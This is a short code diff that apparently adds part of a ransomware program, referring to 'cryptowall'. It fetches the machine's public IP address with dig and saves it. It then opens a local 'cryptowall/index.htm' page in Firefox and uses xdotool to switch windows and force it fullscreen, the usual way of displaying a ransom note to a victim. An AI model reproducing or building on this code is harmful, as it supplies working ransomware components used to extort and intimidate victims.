@@ -1,0 +1,9 @@
+// Get IP Linux
+system("dig @resolver1.opendns.com A myip.opendns.com +short -4 > ip");
+
+// Detach and sendkey Linux
+  system("firefox -new-window cryptowall/index.htm &");
+  sleep(2);
+  system("xdotool key Alt+Tab");
+  sleep(1);
+  system("xdotool key F11");
